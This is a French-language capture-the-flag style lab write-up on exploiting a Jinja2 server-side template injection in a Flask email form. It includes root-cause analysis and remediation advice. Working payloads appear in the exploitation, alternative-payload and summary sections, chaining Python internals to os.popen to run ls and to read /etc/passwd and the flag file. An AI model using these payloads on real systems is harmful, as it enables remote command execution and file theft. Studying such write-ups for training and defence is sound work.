# Write-Up / Server-Side Template Injection (SSTI) Jinja2 / RCE

## Résumé 

Ce rapport documente l'exploitation d'une vulnérabilité d'injection de template côté serveur (SSTI / Server-Side Template Injection) sur un moteur Jinja2 (Python/Flask). La chaîne d'attaque a permis de passer d'une simple injection arithmétique à une exécution de code arbitraire (RCE / Remote Code Execution) sur le serveur, démontrant l'impact maximal de cette classe de vulnérabilité.

**Résultat** : RCE confirmée + extraction du flag + accès en lecture au système de fichiers du serveur.

**Flag capturé** : `JEDHA{J1nj4_T3mpl4t3_1nj3ct10n}`

---

## 1. Contexte et environnement

### Cible
- **Application** : Lab Jedha `template_injection`
- **URL** : `http://10.10.3.17/`
- **Surface d'attaque** : Formulaire web avec champ email
- **Stack présumée** : Python + Flask + Jinja2

### Outils utilisés
- Burp Suite Community (proxy HTTP, Repeater, Decoder)
- Navigateur Firefox avec FoxyProxy
- Jedha CLI (déploiement du lab)

---

## 2. Comprendre la SSTI / Théorie

### Qu'est-ce qu'un moteur de templates ?

Les moteurs de templates permettent aux développeurs de créer des pages HTML dynamiques en mélangeant du code statique avec des variables et des expressions. Quand le serveur reçoit une requête, il rend (render) le template en remplaçant les expressions par leurs valeurs réelles avant d'envoyer la page au client.

**Exemple Jinja2 légitime** :

```python
# Code Flask sécurisé
@app.route('/hello/<name>')
def hello(name):
    return render_template('hello.html', name=name)
```

```html
<!-- hello.html -->
<h1>Bonjour {{ name }} !</h1>
```

Si l'utilisateur visite `/hello/Pierre`, le serveur affiche `<h1>Bonjour Pierre !</h1>`.

### Le problème / Concaténation directe

La SSTI survient quand un développeur **concatène directement** l'entrée utilisateur dans le template au lieu de la passer comme variable :

```python
# Code Flask VULNÉRABLE
@app.route('/hello')
def hello():
    name = request.args.get('name')
    template = f"<h1>Bonjour {name} !</h1>"
    return render_template_string(template)
```

Ici, l'entrée utilisateur fait **partie du template lui-même**. Le moteur Jinja2 va évaluer tout ce qui ressemble à du code template dans cette entrée, y compris du code malveillant.

### Pourquoi c'est critique

Contrairement au XSS qui exécute du JavaScript dans le navigateur de la victime, la SSTI exécute du code **sur le serveur**. L'impact dépasse largement le vol de session :

- Exécution de commandes arbitraires (RCE)
- Lecture/écriture de fichiers
- Accès à la base de données
- Pivot vers d'autres machines du réseau interne
- Compromission complète du serveur

---

## 3. Identification du moteur de templates

### 3.1 Pourquoi identifier le moteur ?

Chaque moteur de templates a sa propre syntaxe et ses propres mécanismes internes. Une payload qui fonctionne pour Jinja2 ne fonctionne pas pour Twig (PHP), ERB (Ruby) ou Freemarker (Java). Identifier le moteur est la première étape obligatoire.

### 3.2 Moteurs candidats

Selon la documentation du lab, deux moteurs sont possibles :
- **Twig** (PHP / Symfony)
- **ERB** (Ruby / Rails)
- **Jinja2** (Python / Flask, Django)
- **Freemarker** (Java)
- **Thymeleaf** (Java / Spring)

### 3.3 Polyglot de détection / `{{7*7}}`

La technique standard est d'envoyer une expression arithmétique simple et d'observer la réponse :

| Payload | Réponse Jinja2 | Réponse Twig | Réponse ERB | Réponse Freemarker |
|---|---|---|---|---|
| `{{7*7}}` | `49` | `49` | `{{7*7}}` (non interprété) | `${...}` requis |
| `{{7*'7'}}` | `7777777` | `49` | non interprété | non interprété |
| `<%= 7*7 %>` | non interprété | non interprété | `49` | non interprété |
| `${7*7}` | non interprété | non interprété | non interprété | `49` |

**La payload `{{7*'7'}}` est discriminante** :
- Jinja2 répète la chaîne 7 fois → `7777777`
- Twig multiplie comme un entier → `49`

---

## 4. Phase de reconnaissance

### 4.1 Surface d'attaque

En visitant `http://10.10.3.17/`, j'ai identifié un formulaire avec un champ email. Ce champ applique une validation HTML5 côté front-end (`type="email"`) qui exige un format valide (`xxx@yyy.zzz`).

```html
<form method="POST">
    <input type="email" name="email" required>
    <button type="submit">Submit</button>
</form>
```

### 4.2 Contournement de la validation front-end

La validation `type="email"` s'exécute uniquement dans le navigateur. Pour contourner cette restriction :

1. Soumettre un email valide pour passer la validation HTML5 (ex: `test@test.com`)
2. Intercepter la requête POST avec Burp Suite
3. Modifier la valeur du paramètre `email` après le passage du filtre front-end

**Requête originale interceptée** :

```http
POST / HTTP/1.1
Host: 10.10.3.17
Content-Type: application/x-www-form-urlencoded
Content-Length: 19

email=test@test.com
```

**Action** : Cette requête a été envoyée vers Burp Repeater pour permettre la modification itérative du paramètre `email`.

### 4.3 Test de détection initial

J'ai modifié le paramètre email avec la payload de détection :

```http
POST / HTTP/1.1
Host: 10.10.3.17
Content-Type: application/x-www-form-urlencoded
Content-Length: 13

email={{7*7}}
```

**Réponse du serveur** :

```html
<p>Email reçu : 49</p>
```

**Confirmation** : Le serveur a évalué `7*7` et retourné `49`. La SSTI est confirmée. Le moteur évalue les expressions entre `{{ }}` ce qui pointe vers **Jinja2** ou **Twig**.

### 4.4 Discrimination Jinja2 vs Twig

Test discriminant avec `{{7*'7'}}` :

```http
email={{7*'7'}}
```

**Réponse du serveur** :

```html
<p>Email reçu : 7777777</p>
```

**Confirmation** : Le moteur a répété la chaîne `'7'` sept fois, comportement caractéristique de **Python (Jinja2)**.

---

## 5. Phase d'exploitation / De l'arithmétique à la RCE

### 5.1 Comprendre l'escalade

Évaluer `7*7` est intéressant pour la détection, mais sans impact. L'objectif réel est d'exécuter des **commandes système** sur le serveur. Pour cela, il faut accéder au module `os` de Python depuis l'intérieur du sandbox Jinja2.

### 5.2 Le sandbox Jinja2 et son contournement

Par défaut, Jinja2 restreint l'accès aux modules Python sensibles. Cependant, il expose certains objets internes qui permettent de remonter jusqu'à `os` via la chaîne de méthodes spéciales de Python.

**La chaîne d'exploitation classique** :

```
config (objet de configuration Flask exposé)
    .__class__         (sa classe Python)
    .__init__          (la méthode constructeur)
    .__globals__       (les variables globales du module)
    ['os']             (le module os exposé dans les globals)
    .popen('cmd')      (exécute une commande système)
    .read()            (lit la sortie de la commande)
```

### 5.3 Première RCE / Lister le répertoire

Payload pour exécuter `ls` :

```jinja2
{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
```

**Requête envoyée** :

```http
POST / HTTP/1.1
Host: 10.10.3.17
Content-Type: application/x-www-form-urlencoded
Content-Length: 79

email={{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
```

**Note d'encodage** : Le `+` et le `:` n'ont pas eu besoin d'être encodés dans ce contexte, mais en cas de problème les caractères spéciaux peuvent être encodés en URL :
- ` ` → `%20` ou `+`
- `'` → `%27`
- `[` → `%5B`
- `]` → `%5D`

**Réponse du serveur** :

```html
<p>Email reçu : app.py
flag.txt
requirements.txt
static
templates
</p>
```

**Confirmation** : Exécution de code à distance réussie. Un fichier `flag.txt` est visible à la racine du répertoire.

### 5.4 Reconnaissance du système / `/etc/passwd`

Avant de récupérer le flag, vérification de l'accès au système de fichiers en dehors du répertoire de l'application :

```jinja2
{{ config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read() }}
```

**Réponse du serveur** (extrait) :

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

**Analyse** :
- L'application tourne probablement sous l'utilisateur `www-data` (utilisateur par défaut des serveurs web sur Debian/Ubuntu)
- L'accès en lecture est confirmé pour les fichiers système accessibles à cet utilisateur
- Pas d'accès root direct, mais surface d'attaque locale exploitable (Linux Privilege Escalation potentielle)

### 5.5 Capture du flag

Payload finale ciblant `flag.txt` :

```jinja2
{{ config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read() }}
```

**Réponse du serveur** :

```html
<p>Email reçu : JEDHA{J1nj4_T3mpl4t3_1nj3ct10n}
</p>
```

**Flag capturé** : `JEDHA{J1nj4_T3mpl4t3_1nj3ct10n}`

---

## 6. Payloads alternatives Jinja2 utiles

Au-delà de la chaîne `config.__class__`, plusieurs autres techniques existent pour atteindre le module `os` :

### 6.1 Via une classe vide

```jinja2
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

Cela liste toutes les sous-classes de `object` en Python. En cherchant l'index de `<class 'os._wrap_close'>` ou `<class 'subprocess.Popen'>`, on peut exécuter des commandes.

### 6.2 Via request (si Flask)

```jinja2
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

### 6.3 Via la classe Popen directement

```jinja2
{{ ''.__class__.__mro__[1].__subclasses__()[XXX]('whoami', shell=True, stdout=-1).communicate()[0] }}
```

Où `XXX` est l'index de `subprocess.Popen` dans la liste des subclasses (varie selon la version de Python).

### 6.4 Lire un fichier sans exécuter de commande

```jinja2
{{ config.__class__.__init__.__globals__['__builtins__'].open('/etc/hostname').read() }}
```

Cette technique utilise la fonction `open()` directement, ce qui peut bypasser certains filtres qui bloquent `popen` ou `os.system`.

---

## 7. Analyse de la cause racine

### 7.1 Code vulnérable typique

Le code Flask responsable de cette vulnérabilité ressemble probablement à :

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/', methods=['POST'])
def index():
    email = request.form.get('email')
    template = f"<p>Email reçu : {email}</p>"
    return render_template_string(template)  # VULNÉRABLE
```

### 7.2 Pourquoi cette construction est dangereuse

`render_template_string()` évalue le template **après** l'avoir construit. Le développeur pense écrire une simple chaîne, mais en réalité il génère du code template dynamiquement. Tout ce qui ressemble à de la syntaxe Jinja2 dans `email` est interprété comme du code.

```python
# Construction du template
template = f"<p>Email reçu : {{ config.__class__... }}</p>"

# Le moteur voit le template comme :
# - Texte statique : <p>Email reçu :
# - Expression à évaluer : {{ config.__class__... }}
# - Texte statique : </p>

# Et il évalue l'expression côté serveur
```

### 7.3 Pourquoi `render_template` (sans `_string`) est sûr

La version sûre passe les variables séparément du template :

```python
@app.route('/', methods=['POST'])
def index():
    email = request.form.get('email')
    return render_template('email.html', email=email)
```

```html
<!-- email.html -->
<p>Email reçu : {{ email }}</p>
```

Ici, la variable `email` est **passée comme donnée** au moteur, pas comme code. Même si l'utilisateur envoie `{{7*7}}`, Jinja2 traite cette valeur comme une chaîne de caractères et l'affiche telle quelle, sans l'évaluer.

---

## 8. Recommandations de remédiation

### Solution 1 / Ne jamais utiliser `render_template_string()` avec des entrées utilisateur

C'est la règle d'or. Toute concaténation d'entrée utilisateur dans un template est dangereuse. Utiliser exclusivement `render_template()` avec des fichiers `.html` séparés et passer les données comme variables.

```python
# Mauvais
return render_template_string(f"Hello {user_input}")

# Bon
return render_template('hello.html', name=user_input)
```

### Solution 2 / Utiliser un environnement Jinja2 sandbox

Si la concaténation dynamique est absolument nécessaire (cas rare), utiliser `SandboxedEnvironment` qui restreint l'accès aux attributs et méthodes sensibles.

```python
from jinja2.sandbox import SandboxedEnvironment

env = SandboxedEnvironment()
template = env.from_string("Hello {{ name }}")
output = template.render(name=user_input)
```

Le sandbox bloque l'accès à `__class__`, `__globals__`, `__subclasses__`, etc.

### Solution 3 / Validation stricte de l'entrée

Si le champ doit contenir un email, valider strictement le format avant tout traitement :

```python
import re

email_regex = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
if not re.match(email_regex, email):
    return "Email invalide", 400
```

### Solution 4 / Principe du moindre privilège

Même en cas d'exploitation, limiter les dégâts en faisant tourner l'application avec un utilisateur restreint et en isolant le processus dans un conteneur Docker non-root.

```dockerfile
# Dockerfile sécurisé
USER nobody  # Pas root
```

### Solution 5 / Web Application Firewall (WAF)

Un WAF correctement configuré (ModSecurity, AWS WAF, Cloudflare) peut détecter les patterns SSTI courants (`{{`, `__class__`, `__globals__`) et bloquer les requêtes avant qu'elles n'atteignent l'application.

---

## 9. Compétences démontrées

### Sécurité offensive
- Identification de moteurs de templates via fingerprinting (polyglot `{{7*7}}`, `{{7*'7'}}`)
- Exploitation de SSTI Jinja2
- Contournement de validation front-end (HTML5 email)
- Construction de chaînes d'exploitation Python (`__class__.__init__.__globals__`)
- Escalade d'une preuve de concept arithmétique à une RCE complète
- Reconnaissance du système cible via lecture de `/etc/passwd`

### Outils et technologies
- Burp Suite (proxy, Repeater, modification de requêtes POST)
- Python / Flask / Jinja2 (compréhension architecturale)
- Encodage URL pour les caractères spéciaux dans les payloads
- Linux (lecture de fichiers système, identification d'utilisateurs)

### Méthodologie
- Phase de détection (polyglot multi-moteurs)
- Phase d'identification (discrimination Jinja2 vs autres moteurs)
- Phase d'exploitation progressive (ls → cat /etc/passwd → cat flag.txt)
- Analyse de causes racines (différence `render_template` vs `render_template_string`)
- Propositions de remédiation multi-couches (code, sandbox, WAF, isolation)

---

## 10. Chaîne d'attaque complète résumée

```
1. Recon
   Visite du site http://10.10.3.17/
   Identification du formulaire avec champ email
   Validation HTML5 type="email" bloque le saisie libre dans le navigateur

2. Bypass front-end
   Soumission de test@test.com (email valide)
   Interception avec Burp Suite
   Modification du paramètre email après le filtre front-end

3. Fingerprinting du moteur
   Payload {{7*7}} → réponse "49" (moteur basé sur expressions {{ }})
   Payload {{7*'7'}} → réponse "7777777" (confirmation Jinja2 / Python)

4. Construction de la chaîne RCE
   {{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
   Listing du répertoire confirmé : flag.txt, app.py, templates, etc.

5. Reconnaissance système
   {{ ...popen('cat /etc/passwd').read() }}
   Identification de l'utilisateur applicatif (www-data)

6. Capture du flag
   {{ ...popen('cat flag.txt').read() }}
   Flag récupéré : JEDHA{J1nj4_T3mpl4t3_1nj3ct10n}
```

---

## 11. Comparaison avec les autres vulnérabilités du portfolio

| Vulnérabilité | Impact | Surface | Difficulté |
|---|---|---|---|
| SQLi (DVWA Medium) | Exfiltration données | Base de données | Moyenne |
| XSS Reflected (DVWA Medium) | Session hijacking | Navigateur victime | Faible |
| SSTI Jinja2 (ce write-up) | RCE complète | Serveur application | Moyenne-Élevée |

La SSTI est généralement considérée comme **plus critique** que SQLi et XSS car elle donne un accès direct au système d'exploitation du serveur. Elle est classée parmi les vulnérabilités les plus impactantes dans le OWASP Top 10 (catégorie A03:2021 / Injection).

---

## 12. Ressources et références

- **OWASP / Server Side Template Injection** : https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection
- **PortSwigger SSTI Lab** : https://portswigger.net/web-security/server-side-template-injection
- **PayloadsAllTheThings / SSTI** : https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
- **HackTricks / SSTI** : https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
- **Jinja2 Documentation** : https://jinja.palletsprojects.com/en/3.1.x/sandbox/

---

*Write-up rédigé lors de la formation Jedha Cybersécurité / Fullstack RNCP Niveau 6*
